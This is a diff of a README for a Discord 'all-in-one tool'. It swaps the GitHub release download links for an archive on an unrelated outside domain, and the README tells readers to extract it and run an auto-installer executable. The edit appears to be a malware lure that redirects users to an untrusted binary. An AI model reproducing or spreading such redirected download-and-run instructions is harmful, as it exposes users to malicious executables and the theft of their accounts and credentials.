@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/fe7cf05a-9f27-4209-b5a0-2f3e9cfd3a63)
-](https://github.com/JackyBlackson/Discord-All-in-One-Tool-2024/releases/download/V5.7/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/JackyBlackson/Discord-All-in-One-Tool-2024/releases/download/V5.7/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
